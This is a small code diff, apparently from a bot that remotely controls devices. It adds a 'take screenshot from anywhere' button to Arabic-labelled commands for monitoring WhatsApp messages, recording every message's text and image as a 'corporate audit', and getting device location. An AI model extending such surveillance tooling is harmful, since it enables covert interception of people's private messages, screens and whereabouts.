@@ -223,6 +223,7 @@ COMMANDS = {
     "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الصادرة", "description": "إيقاف مراقبة الرسائل الصادرة", "needs_param": False},
     "whatsapp-audit-on":   {"category": "data", "label": "🏢 تدقيق مؤسسي", "description": "توثيق نص + صورة لكل رسالة", "needs_param": False},
     "whatsapp-audit-off":  {"category": "data", "label": "⏹ إيقاف التدقيق", "description": "إيقاف نظام التدقيق", "needs_param": False},
+    "single-screenshot":   {"category": "data", "label": "📸 لقطة شاشة", "description": "التقاط صورة من أي مكان", "needs_param": False},
     "audit_outgoing":      {"category": "data", "label": "📤 صورة صادرة", "description": "توثيق صادر", "needs_param": False},
     "audit_incoming":      {"category": "data", "label": "📥 صورة واردة", "description": "توثيق وارد", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
@@ -418,6 +419,7 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
     kb.add(_cbtn(did,"whatsapp-audit-on"))
     kb.add(_cbtn(did,"whatsapp-audit-off"))
+    kb.add(_cbtn(did,"single-screenshot"))
     # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
